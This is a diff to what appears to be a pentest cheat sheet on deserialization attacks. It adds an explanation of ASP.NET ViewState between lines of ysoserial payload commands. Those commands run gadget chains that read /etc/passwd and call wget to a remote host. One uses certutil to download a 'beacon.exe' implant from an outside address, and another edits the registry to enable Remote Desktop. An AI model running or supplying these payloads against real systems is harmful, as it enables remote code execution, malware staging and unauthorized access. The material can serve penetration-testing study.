@@ -21,6 +21,14 @@ java -jar ysoserial-0.0.5-all.jar CommonsCollections1 'wget http://192.168.100.1
 java -jar ysoserial-0.0.5-all.jar CommonsCollections1 'cat /etc/passwd' > passwd.bin
 ```
 # ViewState Deserialization 
+
+view state is the technique used by an ASP.NET Web page to persist changes to the state of a Web Form across postbacks. By default.
+technically ViewState is used to store user data on page at the time of post back of web page however ViewState does not hold the controls,it holds the values of controls.
+When tthe page is accessed, the current state of the page and values that need to be retained during postback are serialized into base64-encoded strings and output in the ViewState hidden field or fields.
+
+* Base64 **Can be defined using EnableViewStateMac and ViewStateEncryptionMode attribute set to false**
+* Base64 + MAC (Message Authentication Code) **Enabled Can be defined using EnableViewStateMac attribute set to true**
+* Base64 + Encrypted **Can be defined using viewStateEncryptionMode attribute set to true**
 ```
 ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "cmd /c certutil.exe -urlcache -split -f  http://192.168.100.199\beacon.exe C:\\Users\\Public\\beacon.exe"
 ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "cmd /c reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f"
